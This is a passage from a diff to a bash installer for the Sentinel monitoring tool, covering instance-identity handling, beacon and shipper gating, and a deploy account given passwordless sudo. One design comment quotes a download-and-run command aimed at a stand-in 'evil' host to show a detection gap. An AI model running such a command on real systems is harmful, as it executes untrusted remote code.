@@ -307,15 +307,27 @@ dangerous — but set it before enabling auto-block."
 
     export SENTINEL_PUBLIC_PORT="$PUBLIC_PORT"
 
-    # Stabilise the snapshot directory across resumes. SNAPSHOT_DIR is seeded from
-    # a per-run timestamp, so a resumed process would point at a directory step 18
-    # never created — breaking the nginx-config backup (step 33) and the automatic
-    # rollback (step 38), both of which write to and read from it. If a prior run
-    # already made the snapshot, its `predeploy-latest` symlink is the truth.
-    local latest="${SENTINEL_BACKUP_DIR}/predeploy-latest"
-    if [[ -L "$latest" ]]; then
-        local resolved; resolved="$(readlink -f "$latest" 2>/dev/null || true)"
-        [[ -n "$resolved" && -d "$resolved" ]] && SNAPSHOT_DIR="$resolved"
+    # Stabilise the snapshot directory ONLY when step 18 will not run this
+    # session. SNAPSHOT_DIR is seeded from a per-run timestamp, so a run that
+    # skips step 18 would point at a directory nobody created — breaking the
+    # nginx-config backup (step 33) and the automatic rollback (step 38), both of
+    # which write to and read from it. There, `predeploy-latest` is the truth.
+    #
+    # The condition used to be "the symlink exists", and that was wrong in a way
+    # that only showed up weeks later. The symlink outlives the run that made it,
+    # so every later deploy inherited the FIRST snapshot ever taken and then
+    # printed it as its rollback target. Measured on 21 August 2026: a deploy
+    # advertised a snapshot whose files were all dated 31 July. A rollback would
+    # have restored three weeks of unrelated state — nftables, nginx, the package
+    # list — to undo one change. The step is in ALWAYS_STEPS now, so the only
+    # remaining way for it not to run is --from-step above it, and that is
+    # exactly what this tests for.
+    if [[ -n "${FROM_STEP:-}" ]] && (( FROM_STEP > 18 )); then
+        local latest="${SENTINEL_BACKUP_DIR}/predeploy-latest"
+        if [[ -L "$latest" ]]; then
+            local resolved; resolved="$(readlink -f "$latest" 2>/dev/null || true)"
+            [[ -n "$resolved" && -d "$resolved" ]] && SNAPSHOT_DIR="$resolved"
+        fi
     fi
 }
 
@@ -722,8 +734,24 @@ GENERATED_SECRET_KEYS=(TELEGRAM_CALLBACK_HMAC_KEY SENTINEL_SESSION_SECRET)
 # this installer knows or one this host already has — and a name it invents is
 # refused out loud, with the fix: put it on the host once, and every later run
 # carries it.
+#
+# SENTINEL_BEACON_SECRET and SENTINEL_SHIP_SECRET joined the list on 19 August
+# 2026. Both are HALF OF A PAIR held by a party outside this host — the external
+# witness and the aggregator — so neither may ever be generated here, and both
+# must be settable on a host that has never had one. Until now the only way to
+# place either was to write it into secrets.env by hand and let a later run
+# carry it forward, which meant the documented path for a shipped feature began
+# with an undocumented manual step performed as root.
+#
+# The beacon key is the proof that the gap has teeth, and the comment above
+# records it: its absence from these lists is what turned `--force-step 22,27`
+# into a rotation that destroyed the only copy of a key nothing could restore.
+# Carrying keys forward fixed the destruction. It did not give either key a way
+# in, and a key with no way in is a key that gets placed by hand, once, by
+# whoever remembers.
 OPERATOR_SECRET_KEYS=(ANTHROPIC_API_KEY TELEGRAM_BOT_TOKEN TELEGRAM_CHAT_ID
-                      SENTINEL_DB_PASSWORD TELEGRAM_APPLY_PIN)
+                      SENTINEL_DB_PASSWORD TELEGRAM_APPLY_PIN
+                      SENTINEL_BEACON_SECRET SENTINEL_SHIP_SECRET)
 
 # Read a key out of the secrets file already on disk, if there is one.
 #
@@ -737,6 +765,167 @@ existing_secret() {
     local line
     line="$(grep -m1 "^[[:space:]]*${key}=" "$target" 2>/dev/null)" || return 1
     printf '%s' "${line#*=}"
+}
+
+# Identitatea instalării: o valoare aleatoare, generată o dată și niciodată din
+# nou. Aceleași reguli ca la GENERATED_SECRET_KEYS de mai sus, din același
+# motiv: valoarea supraviețuiește instalării și altcineva o ține minte.
+#
+# De ce nu hostname: se schimbă (redenumire, migrare, un panou care recreează
+# VPS-ul), iar o identitate schimbată bifurcă istoria unui server în două pe un
+# agregator care adună mai multe. E și recunoaștere gratuită acolo — spune cui
+# se uită cum se cheamă mașinile operatorului.
+#
+# De ce nu /etc/machine-id: o mașină clonată îl moștenește. Două servere cu
+# aceeași identitate e exact eșecul pe care valoarea aleatoare îl evită, și e
+# singurul care nu produce niciun raport de defecțiune nicăieri: agregatorul
+# contopește două istorii într-una și cifrele doar încetează să însemne ce spun.
+#
+# Deci: un fișier existent se duce mai departe NEATINS, iar unul cu conținut
+# nerecunoscut nu se rescrie — se semnalează. Poate fi singura copie a unei
+# valori pe care agregatorul o cunoaște deja.
+# Citește fișierul de identitate ÎNTR-O VARIABILĂ, sau refuză să pretindă că
+# poate. Valoarea ajunge în INSTANCE_ID_READ; codul de ieșire spune de ce nu:
+#
+#   0  s-a citit; INSTANCE_ID_READ e conținutul fără spațiul de la capete
+#   1  fișierul nu există
+#   2  fișierul EXISTĂ dar nu poate fi reprezentat aici (conține NUL)
+#   3  nu s-a putut măsura fișierul — nu se știe nimic despre el
+#
+# Motivul pentru care e o funcție și nu două linii repetate: o variabilă de
+# shell NU poate conține octetul NUL. `$(cat fișier)` îl aruncă tăcut (bash
+# scrie „ignored null byte in input" pe stderr și continuă cu restul), deci un
+# fișier care conține „<32 de hexa><NUL>" ajungea aici drept identitate perfect
+# validă — în timp ce `Path.read_text()` din sentinel/identity.py îl păstrează
+# și refuză valoarea de 33 de caractere.
+#
+# Nu e o coliziune teoretică: e chiar forma pe care o ia coruperea de care
+# vorbește comentariul de la re-citire. Un ext4/xfs care pierde curentul la
+# mijlocul unei scrieri completează blocul cu NUL, nu trunchiază fișierul. Deci
+# garda pusă anume pentru scrierea parțială era oarbă exact la varianta ei cea
+# mai probabilă, iar rezultatul era: instalare verde, iar peste ore
+# „⚪ Nu pot citi identitatea instalării" despre fișierul pe care instalatorul
+# tocmai îl garantase.
+#
+# Se compară numărul de octeți cu și fără NUL ÎNAINTE de orice citire în
+# variabilă. Egale = fișierul poate fi reprezentat aici; diferite = nu poate, și
+# atunci singurul răspuns onest e că nu e o identitate.
+#
+# LIMITĂ CUNOSCUTĂ, lăsată dinadins: fișierul e măsurat de două ori și citit a
+# treia oară, deci un NUL apărut între măsurare și citire ar trece. Nimic
+# altceva nu scrie /etc/sentinel/instance_id — pasul ăsta e singurul scriitor,
+# iar fișierul e 0640 root:sentinel — deci fereastra nu e accesibilă în
+# practică. Închiderea ei înseamnă citirea octeților O SINGURĂ dată, printr-o
+# codare care îi poate purta pe toți (`od`, `base64`), nu măsurare-apoi-citire.
+# Scrisă aici fiindcă o limită nedocumentată e cea care se descoperă târziu.
+INSTANCE_ID_READ=""
+
+read_instance_id_file() {
+    local path="$1" total nulless value
+    INSTANCE_ID_READ=""
+    [[ -f "$path" ]] || return 1
+
+    total="$(wc -c < "$path" 2>/dev/null | tr -d '[:space:]' || true)"
+    nulless="$(LC_ALL=C tr -d '\000' < "$path" 2>/dev/null | wc -c | tr -d '[:space:]' || true)"
+    [[ -n "$total" && -n "$nulless" ]] || return 3
+    [[ "$total" == "$nulless" ]] || return 2
+
+    # Se taie DOAR spațiul de la capete, exact cele șase caractere pe care le
+    # taie și `str.strip(" \t\n\r\v\f")` din sentinel/identity.py, celălalt
+    # cititor al aceluiași fișier. Un `tr -d '[:space:]'` ar fi scos și spațiul
+    # dinăuntru, deci un fișier editat de mână în „0123 4567…" ar fi trecut aici
+    # drept valid și ar fi fost refuzat acolo — instalare verde, autoverificare
+    # roșie, despre același fișier.
+    value="$(cat "$path" 2>/dev/null || true)"
+    value="${value#"${value%%[![:space:]]*}"}"
+    value="${value%"${value##*[![:space:]]}"}"
+    INSTANCE_ID_READ="$value"
+    return 0
+}
+
+ensure_instance_id() {
+    local target="${SENTINEL_CONFIG_DIR}/instance_id" current="" written="" rc=0
+
+    rc=0; read_instance_id_file "$target" || rc=$?
+    current="$INSTANCE_ID_READ"
+
+    if (( rc == 3 )); then
+        # Nici „are identitate", nici „nu are". A genera peste un fișier despre
+        # care nu se știe nimic e singurul lucru ireversibil de aici.
+        die "nu pot măsura ${target}; refuz să decid dacă gazda are deja identitate"
+    fi
+
+    if (( rc == 2 )); then
+        warn "${target} conține octeți NUL, deci nu e o identitate — și nu poate fi"
+        warn "citit corect nici măcar de shell. Așa arată o scriere întreruptă: un"
+        warn "sistem de fișiere completează blocul cu NUL, nu taie fișierul."
+        warn "NU a fost rescris. Uită-te în el:  od -c ${target}"
+        warn "Dacă nu e o identitate, șterge-l și re-rulează pasul:"
+        warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
+        return 0
+    fi
+
+    if [[ -n "$current" ]]; then
+        if [[ ! "$current" =~ ^[0-9a-f]{32}$ ]]; then
+            warn "${target} există dar nu conține o identitate validă (se așteaptă 32"
+            warn "de caractere hexa minuscule). NU a fost rescris, dinadins: dacă"
+            warn "valoarea veche a ajuns vreodată la un agregator, suprascrierea ar"
+            warn "rupe istoria acestui server în două. Uită-te în el; dacă nu e o"
+            warn "identitate, șterge-l și re-rulează pasul:"
+            warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
+            # `return`, nu `current=""`: căderea în ramura de mai jos ar fi
+            # tipărit linia verde „identitatea instalării păstrată" peste un
+            # fișier despre care tocmai s-a spus că nu e o identitate.
+            return 0
+        fi
+        # Modul și proprietarul se reafirmă și pe un fișier păstrat. Procesele
+        # rulează ca ${SENTINEL_USER} și citesc prin GRUP; un fișier rămas
+        # 0600 root:root după o restaurare din backup face identitatea
+        # necitibilă, iar simptomul nu apare aici, ci peste ore, ca o
+        # autoverificare „nu pot citi identitatea".
+        chown "root:${SENTINEL_USER}" "$target"
+        chmod 0640 "$target"
+        ok "identitatea instalării păstrată (${current:0:8}…) — nu se regenerează niciodată"
+        return 0
+    fi
+
+    [[ -f "$target" ]] && warn "${target} era gol — nu e nimic de păstrat, se generează"
+
+    have openssl || die "openssl lipsește; nu pot genera identitatea instalării"
+
+    # Modul corect ÎNAINTE de conținut, ca la secrets.env: a scrie întâi și a da
+    # chmod după lasă o fereastră în care fișierul e lizibil de oricine.
+    ( umask 077; : > "${target}.tmp" )
+    chown "root:${SENTINEL_USER}" "${target}.tmp"
+    chmod 0640 "${target}.tmp"
+    openssl rand -hex 16 > "${target}.tmp" || die "openssl rand a eșuat"
+    mv "${target}.tmp" "$target"
+
+    # Ce dovedește că a mers: valoarea RECITITĂ de pe disc are forma cerută.
+    # Codul de ieșire al lui openssl nu spune nimic despre ce a ajuns în fișier
+    # — redirectarea e a shell-ului, nu a lui, iar un disc plin sau o cotă atinsă
+    # lasă în urmă un fișier gol sau trunchiat. O identitate trunchiată se
+    # coliziona cu alta la fel de trunchiată, și nimic n-ar fi spus-o.
+    #
+    # Prin `read_instance_id_file`, nu printr-un `$(cat …)` direct, din același
+    # motiv pentru care există funcția: substituția de comandă aruncă NUL, deci
+    # o scriere parțială completată cu NUL — forma cea mai probabilă a exact
+    # eșecului descris mai sus — ar fi trecut de propria ei gardă.
+    # CONSECINȚĂ CUNOSCUTĂ: fișierul stricat rămâne pe disc, iar fiecare rulare
+    # de după el îl refuză, deci gazda nu capătă identitate până nu-l șterge un
+    # om — chiar dacă valoarea fusese bătută cu o secundă înainte și n-a văzut-o
+    # niciun agregator. Acceptată dinadins: pasul nu are memoria fișierului pe
+    # care tocmai l-a scris, deci nu poate deosebi „e al meu, de acum" de „era
+    # aici dinainte", iar a doua e valoarea pe care nu are voie s-o distrugă.
+    # Mesajele de mai jos spun exact ce e de făcut.
+    rc=0; read_instance_id_file "$target" || rc=$?
+    written="$INSTANCE_ID_READ"
+    (( rc == 0 )) \
+        || die "identitatea scrisă în ${target} nu se poate reciti (cod ${rc})"
+    [[ "$written" =~ ^[0-9a-f]{32}$ ]] \
+        || die "identitatea scrisă în ${target} nu se recitește ca 32 de caractere hexa"
+
+    ok "identitate de instalare generată: ${written:0:8}… (${target}, 0640 root:${SENTINEL_USER})"
 }
 
 step_secrets() {
@@ -1074,6 +1263,19 @@ step_start_services() {
             && ok "${unit} enabled"
     done
 
+    start_beacon_unit /etc/systemd/system/sentinel-beacon.service
+    start_shipper_unit /etc/systemd/system/sentinel-shipper.service
+}
+
+# Repornirea beaconului, cu poarta pe care nu o poate trece un expeditor mut.
+#
+# Calea unității vine ca ARGUMENT, nu ca variabilă de mediu cu valoare implicită:
+# un knob de mediu într-un instalator e ceva ce cineva ajunge să pună din
+# greșeală în producție, iar aici nu e nevoie de el — apelantul o scrie o dată,
+# iar testul îi dă un director propriu.
+start_beacon_unit() {
+    local unit_file="$1"
+
     # The beacon is opt-in and deliberately NOT in the ordered list above. That
     # list dies on a unit that will not stay running, which is right for the
     # pipeline and wrong here: with beacon.enabled false the process says so
@@ -1081,17 +1283,115 @@ step_start_services() {
     # failed. Aborting an install over a component the operator has not turned
     # on yet would be absurd. Enable it either way, so that turning it on later
     # is one `systemctl restart`, not an archaeology session.
-    if [[ -f /etc/systemd/system/sentinel-beacon.service ]]; then
-        systemctl enable sentinel-beacon.service >/dev/null 2>&1 || true
-        # restart, not `enable --now`: on a host where the beacon is already
-        # running, `--now` is a no-op and the process keeps executing the code
-        # from the previous deployment. It would look enabled, report healthy,
-        # and quietly never pick up a fix.
-        if systemctl restart sentinel-beacon.service 2>/dev/null; then
-            ok "sentinel-beacon.service enabled and restarted"
-        else
-            info "sentinel-beacon.service installed but not started (beacon.enabled is false)"
-        fi
+    if [[ ! -f "$unit_file" ]]; then
+        info "sentinel-beacon.service: not in this build (${unit_file})"
+        return 0
+    fi
+    systemctl enable sentinel-beacon.service >/dev/null 2>&1 || true
+
+    # POARTA. Din august 2026 expeditorul refuză să trimită un semnal pe care
+    # nu-l poate semna cu identitatea gazdei (sentinel/report/beacon.py), fiindcă
+    # un semnal fără nume aterizează în găleata comună `default`. Deci o
+    # repornire făcută peste un fișier de identitate lipsă sau stricat nu
+    # „actualizează" beaconul, ci îl oprește din bătut — și martorul raportează,
+    # corect din punctul lui de vedere, o alarmă critică despre un server viu.
+    #
+    # `ensure_instance_id` rulează necondiționat înaintea acestui pas, deci
+    # fișierul LIPSĂ nu mai e cazul obișnuit. Ce rămâne, și de ce poarta merită
+    # să existe: funcția aia refuză DELIBERAT să rescrie un fișier existent dar
+    # nevalid (octeți NUL, scriere trunchiată, valoare pusă de mână) — avertizează
+    # și iese cu 0. Fără poarta asta, exact acel caz ajungea la o repornire care
+    # transformă un beacon care bate într-unul mut.
+    #
+    # A NU reporni e alegerea mai bună dintre două rele: procesul vechi rămâne
+    # în picioare cu codul dinaintea livrării, deci martorul continuă să audă
+    # ceva, iar `code:current` din autodiagnostic raportează că unitatea rulează
+    # cod vechi. Tăcerea nu se raportează de nicăieri.
+    local rc=0
+    read_instance_id_file "${SENTINEL_CONFIG_DIR}/instance_id" || rc=$?
+    if (( rc != 0 )) || [[ ! "$INSTANCE_ID_READ" =~ ^[0-9a-f]{32}$ ]]; then
+        warn "NU repornesc sentinel-beacon: ${SENTINEL_CONFIG_DIR}/instance_id nu"
+        warn "conține o identitate validă, iar expeditorul refuză să trimită un"
+        warn "semnal pe care nu-l poate atribui acestei gazde. Repornit acum, ar"
+        warn "amuți, iar martorul ar suna o alarmă critică despre un server viu."
+        warn "Uită-te în fișier (od -c), șterge-l dacă nu e o identitate, apoi:"
+        warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
+        warn "Până atunci procesul vechi rămâne pornit, cu codul dinaintea acestei"
+        warn "livrări — autodiagnosticul îl raportează la 'code:current'."
+        return 0
+    fi
+
+    # restart, not `enable --now`: on a host where the beacon is already
+    # running, `--now` is a no-op and the process keeps executing the code
+    # from the previous deployment. It would look enabled, report healthy,
+    # and quietly never pick up a fix.
+    if systemctl restart sentinel-beacon.service 2>/dev/null; then
+        ok "sentinel-beacon.service enabled and restarted"
+    else
+        info "sentinel-beacon.service installed but not started (beacon.enabled is false)"
+    fi
+}
+
+# Expeditorul de loturi. Aceeași formă ca beaconul, și separată dinadins.
+#
+# De ce trebuie ACTIVATĂ, nu doar copiată: pasul de mai sus instalează fiecare
+# `deploy/systemd/*.service` de pe disc, deci unitatea ajunge pe gazdă oricum.
+# O unitate instalată și neactivată e o componentă care nu rulează niciodată —
+# iar `scripts/smoke-test.sh` enumeră unitățile TOT de pe disc, deci una care
+# rămâne `inactive` fără timer și fără scutire raportează „deployment eșuat" pe
+# fiecare gazdă, inclusiv pe cele unde `ship.enabled: false` e exact ce trebuie.
+# Ambele capete ale problemei sunt aceeași cauză: două locuri enumeră unitățile
+# și niciunul nu era generat.
+start_shipper_unit() {
+    local unit_file="$1"
+
+    if [[ ! -f "$unit_file" ]]; then
+        info "sentinel-shipper.service: not in this build (${unit_file})"
+        return 0
+    fi
+    # Necondiționat, ca la beacon: cu `ship.enabled` fals procesul spune o dată
+    # în jurnal și iese cu 0, deci activarea nu costă nimic, iar pornirea de mai
+    # târziu e un `systemctl restart` în loc de o sesiune de arheologie.
+    systemctl enable sentinel-shipper.service >/dev/null 2>&1 || true
+
+    # ACEEAȘI POARTĂ ca la beacon, cu o miză diferită — și diferența merită
+    # scrisă, fiindcă altfel poarta pare copiată din reflex.
+    #
+    # Un beacon mut produce o alarmă CRITICĂ falsă la martor. Un expeditor mut nu
+    # produce nicio alarmă externă: `ship_once` întoarce
+    # `ShipResult(False, "fără identitate de instalare")`, rândurile rămân în
+    # coadă, iar singurul care spune ceva e `ship:lag` din autodiagnostic, la
+    # următoarea rulare a `sentinel-selfcheck.timer`.
+    #
+    # Poarta există totuși, din același motiv: repornit peste o identitate
+    # stricată, un expeditor care EXPEDIA devine unul care nu mai expediază, și
+    # rândurile lui nu ajung la agregator cât timp nimeni nu se uită. Procesul
+    # vechi, lăsat în picioare, continuă să expedieze sub identitatea pe care a
+    # citit-o deja — iar `code:current` raportează că rulează cod vechi. Dintre
+    # „vechi dar expediază" și „nou și tăcut", primul se vede de undeva.
+    local rc=0
+    read_instance_id_file "${SENTINEL_CONFIG_DIR}/instance_id" || rc=$?
+    if (( rc != 0 )) || [[ ! "$INSTANCE_ID_READ" =~ ^[0-9a-f]{32}$ ]]; then
+        warn "NU repornesc sentinel-shipper: ${SENTINEL_CONFIG_DIR}/instance_id nu"
+        warn "conține o identitate validă, iar expeditorul refuză să trimită un lot"
+        warn "pe care nu-l poate atribui acestei gazde — rândurile a două gazde"
+        warn "fără identitate ar ajunge într-un singur lanț de audit, care ar arăta"
+        warn "rupt în permanență fără să fie rupt ceva."
+        warn "Uită-te în fișier (od -c), șterge-l dacă nu e o identitate, apoi:"
+        warn "    ./scripts/deploy.sh --host <gazdă> --user <utilizator> --force-step 27"
+        warn "Până atunci procesul vechi rămâne pornit, cu codul dinaintea acestei"
+        warn "livrări — autodiagnosticul îl raportează la 'code:current'."
+        return 0
+    fi
+
+    # restart, nu `enable --now`: pe o gazdă unde expeditorul rulează deja,
+    # `--now` e operație nulă și procesul continuă să execute codul livrării
+    # dinainte. Ar părea activat, ar raporta sănătos, și n-ar prelua niciodată o
+    # reparație.
+    if systemctl restart sentinel-shipper.service 2>/dev/null; then
+        ok "sentinel-shipper.service enabled and restarted"
+    else
+        info "sentinel-shipper.service installed but not started (ship.enabled is false)"
     fi
 }
 
@@ -1704,6 +2004,138 @@ step_suricata() {
 }
 
 # --- 36 -------------------------------------------------------------------
+# The account automation logs in as, kept apart from yours.
+#
+# ## Why this exists
+#
+# The login-history feature alerts on every INTERACTIVE session — one with a
+# terminal — and stays quiet for sessions without one. That works today only
+# because every automation on this host happens to run `ssh host "command"`,
+# which allocates no tty. It is a proxy, not a boundary: anyone holding the key
+# can run `ssh host "curl evil | sh"` and get the same silence.
+#
+# Measured on 24 August 2026, the host had exactly ONE authorised key, and both
+# the operator and the deploy scripts used it. There was nothing to tell them
+# apart — not the key fingerprint, not the source address, not the account.
+#
+# With a separate account, "no terminal" stops being the discriminator and
+# IDENTITY takes over: a session on the deploy account is automation, and a
+# session without a terminal on the OPERATOR account becomes a surprise again.
+#
+# ## What this step does NOT do
+#
+# It does not create a key. The private half must never exist on this host, and
+# never passes through this script: the operator generates it on their own
+# machine and installs only the public half. A deploy key generated by the thing
+# being deployed to is a key the host has seen.
+#
+# It also does not switch the deploy scripts over. The account is created and
+# left ready; `scripts/deploy.sh --user` is the operator's to change, once they
+# have confirmed they can log in with it. A step that flipped both at once would
+# make the first failure a lockout.
+DEPLOY_ACCOUNT="${DEPLOY_ACCOUNT:-sentinel-deploy}"
+
+step_deploy_account() {
+    if ! id -u "$DEPLOY_ACCOUNT" >/dev/null 2>&1; then
+        # `--system` deliberately NOT used: a system account gets a uid below
+        # 1000, and every audit rule on this host filters on `auid>=1000` or
+        # `auid!=unset`. A system account would be invisible to exactly the
+        # history this account exists to be distinguishable in.
+        useradd --create-home --shell /bin/bash \
+                --comment "Sentinel automation (deploys, diagnostics)" \
+                "$DEPLOY_ACCOUNT"
+        ok "created ${DEPLOY_ACCOUNT}"
+    else
+        ok "${DEPLOY_ACCOUNT} already exists"
+    fi
+
+    install -d -m 0700 -o "$DEPLOY_ACCOUNT" -g "$DEPLOY_ACCOUNT" \
+            "/home/${DEPLOY_ACCOUNT}/.ssh"
+    touch "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys"
+    chown "${DEPLOY_ACCOUNT}:${DEPLOY_ACCOUNT}" "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys"
+    chmod 0600 "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys"
+
+    # sudo without a password, because a deploy runs unattended and a prompt it
+    # cannot answer is a deploy that hangs until it times out. Scoped to ALL
+    # rather than a command list, and that is a deliberate, stated choice: the
+    # installer runs dnf, systemctl, nft, useradd, install, tee and more, and a
+    # list that drifts out of date fails a deploy halfway through — which is the
+    # single most dangerous moment to fail.
+    #
+    # What makes this survivable is that the account is now VISIBLE: every
+    # command it runs lands in `session_commands` with its arguments, forever.
+    # The trade is "unrestricted but fully recorded" over "restricted, drifting,
+    # and recorded" — and the second only looks safer.
+    # The filename carries a numeric prefix and the word "account", and BOTH
+    # halves are scar tissue from 25 August 2026.
+    #
+    # The first version wrote `/etc/sudoers.d/sentinel-deploy` — the obvious
+    # name, and the same one the operator had already used by hand for their own
+    # NOPASSWD rule, because `docs/CHANGELOG.md` 0.6.0 says a deploy from Windows
+    # needs one. The step overwrote it. Nothing failed, nothing warned: the file
+    # validated, the step reported success, and the operator's passwordless sudo
+    # was simply gone until the next time they tried to use it.
+    #
+    # So: a name this step owns, and a REFUSAL to touch anything else.
+    local sudoers=/etc/sudoers.d/60-sentinel-deploy-account
+    local marker="# managed by sentinel install.sh step_deploy_account"
+
+    # Never clobber a file we did not write. A hand-made rule with our name on it
+    # is somebody's access, and losing it is exactly the failure above.
+    if [[ -e "$sudoers" ]] && ! grep -qF "$marker" "$sudoers"; then
+        warn "${sudoers} exists and was not written by this step — leaving it alone."
+        warn "Nothing was changed. If it should hold the automation rule, move it aside first."
+        return 0
+    fi
+
+    printf '%s\n%s ALL=(ALL) NOPASSWD: ALL\n' "$marker" "$DEPLOY_ACCOUNT" > "$sudoers"
+    chmod 0440 "$sudoers"
+    # Not `visudo -c` on the whole tree — on the FILE. A syntax error anywhere in
+    # sudoers.d makes sudo refuse everything for everyone, including the operator
+    # recovering from it. Checked before it can take effect.
+    if ! visudo -cf "$sudoers" >/dev/null; then
+        rm -f "$sudoers"
+        die "the sudoers fragment for ${DEPLOY_ACCOUNT} did not validate; removed"
+    fi
+    ok "sudo rule for ${DEPLOY_ACCOUNT} installed and validated"
+
+    # The wreckage of the first version, if this host ran it. That file used to
+    # hold the OPERATOR's rule on hosts where they had written one; now it holds
+    # only ours, and the operator's passwordless sudo is gone without a word.
+    #
+    # Detected rather than repaired: we do not know what their rule said, and
+    # writing a guess into sudoers is worse than saying what happened.
+    local clobbered=/etc/sudoers.d/sentinel-deploy
+    if [[ -f "$clobbered" ]] \
+       && grep -q "^${DEPLOY_ACCOUNT} ALL=" "$clobbered" \
+       && [[ "$(wc -l < "$clobbered")" -le 2 ]]; then
+        warn "${clobbered} contains ONLY the automation rule."
+        warn "An earlier version of this step wrote that file, and on hosts where"
+        warn "you kept your own NOPASSWD rule there, it was overwritten — which is"
+        warn "why sudo may now ask you for a password. Restore yours with:"
+        warn "    echo '<your-user> ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/50-operator"
+        warn "    sudo chmod 0440 /etc/sudoers.d/50-operator && sudo visudo -c"
+        warn "Then remove the stale file: sudo rm -f ${clobbered}"
+    fi
+
+    # The effect, not the intent. An account with no key cannot log in, and
+    # saying "created" about it would be the same class of lie this whole
+    # repository keeps tripping over.
+    if [[ ! -s "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys" ]]; then
+        warn "${DEPLOY_ACCOUNT} has NO authorised key yet, so it cannot log in."
+        warn "Generate one on YOUR machine (the private half must never reach this host):"
+        warn "    ssh-keygen -t ed25519 -f ~/.ssh/sentinel_deploy -C sentinel-deploy"
+        warn "Then install the public half:"
+        warn "    ssh-copy-id -i ~/.ssh/sentinel_deploy.pub ${DEPLOY_ACCOUNT}@<host>"
+        warn "Then switch the deploy scripts over:"
+        warn "    scripts/deploy.sh --user ${DEPLOY_ACCOUNT} --key ~/.ssh/sentinel_deploy …"
+    else
+        local keys
+        keys="$(grep -c '^ssh-' "/home/${DEPLOY_ACCOUNT}/.ssh/authorized_keys" || true)"
+        ok "${DEPLOY_ACCOUNT} has ${keys} authorised key(s)"
+    fi
+}
+
 step_auxiliary() {
     if [[ -f "${SCRIPT_DIR}/audit/sentinel.rules" ]]; then
         install -D -m 0640 "${SCRIPT_DIR}/audit/sentinel.rules" /etc/audit/rules.d/sentinel.rules
@@ -1766,8 +2198,158 @@ step_auxiliary() {
 }
 
 # --- 37 -------------------------------------------------------------------
+# Beaconul BATE? — nu „e activ", ci contorul lui a avansat.
+#
+# `sentinel-beacon.service` poate fi `active` și complet mut: fără identitate de
+# instalare expeditorul nu trimite nimic, iar procesul rămâne în picioare la
+# aceeași cadență, dinadins (sentinel/report/beacon.py). Deci `is-active` e
+# exact tiparul din CLAUDE.md — cod de ieșire în loc de efect — cu o singură
+# diferență: aici efectul e vizibil.
+#
+# `beacon:seq` din `collector_cursors` se incrementează chiar înainte de POST,
+# deci avansează și când martorul e căzut sau refuză semnalul. Asta e proprietatea
+# potrivită: verificăm că EXPEDITORUL produce semnale, nu că martorul le acceptă
+# — al doilea depinde de o cheie pusă manual în alt panou și n-are ce căuta
+# într-o poartă de instalare.
+smoke_beacon_is_beating() {
+    local waited=0 limit before after
+
+    if ! systemctl is-active --quiet sentinel-beacon.service; then
+        # Ce s-a OBSERVAT, nu de ce. Cauza obișnuită e că martorul extern nu e
+        # configurat, dar starea asta se atinge și cu el configurat perfect: o
+        # identitate coruptă face `ensure_instance_id` să refuze rescrierea și
+        # `start_beacon_unit` să refuze repornirea, iar unitatea rămâne activată
+        # și nepornită. O propoziție liniștitoare despre o cauză pe care
+        # verificarea nu s-a uitat la ea e chiar tiparul din CLAUDE.md.
+        info "sentinel-beacon nu rulează — nimic de probat"
+        return 0
+    fi
+
+    # Fereastra se derivă din cadență, nu e o constantă. `beacon.interval_s` nu
+    # are limită superioară în `_validate`, deci un interval de 120 s ar face
+    # verificarea asta să se plângă la FIECARE instalare despre un beacon perfect
+    # sănătos — iar un avertisment care apare mereu e unul pe care nimeni nu-l
+    # mai citește. Martorul își scalează la fel răbdarea (`allowance` din
+    # aggregator/lib/verify.ts), doar cu alt factor.
+    limit="$(( 2 * $(beacon_interval_s) ))"
+    (( limit < 90 )) && limit=90
+
+    before="$(beacon_seq)"
+    while (( waited < limit )); do
+        sleep 5; waited=$((waited + 5))
+        after="$(beacon_seq)"
+        # `-n` nu e prisos: `beacon_seq` întoarce ȘIR GOL și când interogarea
+        # eșuează — postgres repornit, limită de conexiuni atinsă, socket căzut —
+        # fiindcă stderr-ul ei merge la /dev/null. Fără el, primul eșec de sondă
+        # ar fi „diferit de valoarea dinainte", iar instalarea ar tipări o linie
+        # verde de succes cu dovada goală în ea: „beacon:seq 7098 → , în 5s".
+        # Adică exact minciuna pe care funcția asta există ca s-o oprească, un
+        # strat mai jos.
+        if [[ -n "$after" && "$after" != "$before" ]]; then
+            ok "beaconul bate (beacon:seq ${before:-–} → ${after}, în ${waited}s)"
+            return 0
+        fi
+    done
+
+    warn "sentinel-beacon e ACTIV dar nu a trimis niciun semnal în ${waited}s"
+    warn "(beacon:seq a rămas la '${before:-inexistent}'). Un proces viu care nu"
+    warn "trimite e tăcere pentru martorul extern, iar el o va raporta ca alarmă"
+    warn "critică. Cauza cea mai probabilă e identitatea instalării:"
+    warn "    journalctl -u sentinel-beacon -n 30"
+    warn "    ls -l ${SENTINEL_CONFIG_DIR}/instance_id"
+}
+
+# Cadența beaconului din configurație, sau 60 dacă nu se poate afla.
+#
+# Valoarea implicită e cea din `BeaconConfig`, nu una inventată aici, iar o
+# configurație pe care n-o putem citi duce la fereastra dinainte — nu la una
+# infinită. „Nu știu" nu are voie să însemne „așteaptă oricât".
+#
+# `tr -dc '0-9'` a fost înlocuit fiindcă ștergea punctul în loc să-l înțeleagă:
+# `60.0` ieșea `600` (fereastră de 20 de minute în loc de 2), iar `0.5` ieșea
+# `05`. Cât timp `_coerce` din sentinel/config.py lăsa floatul neatins, un
+# `interval_s: 60.0` era vizibil greșit peste tot; de când îl normalizează la
+# `60`, funcția asta a rămas SINGURUL cititor care mai înțelege altceva decât
+# agentul — adică o valoare pe care instalatorul și serviciul o citesc diferit,
+# fără ca ceva să spună asta.
+#
+# Ce nu se ghicește se refuză, și atunci se folosește valoarea implicită: `0.5`
+# nu are conversie onestă la un întreg (`_coerce` îl respinge cu ConfigError), și
+# nici `abc`. „Nu știu" înseamnă fereastra implicită, nu o cifră inventată din
+# caractere rămase.
+beacon_interval_s() {
+    local raw value default=60
+    # `|| true` nu e prisos: `awk` iese cu 2 pe un fișier care nu există, iar
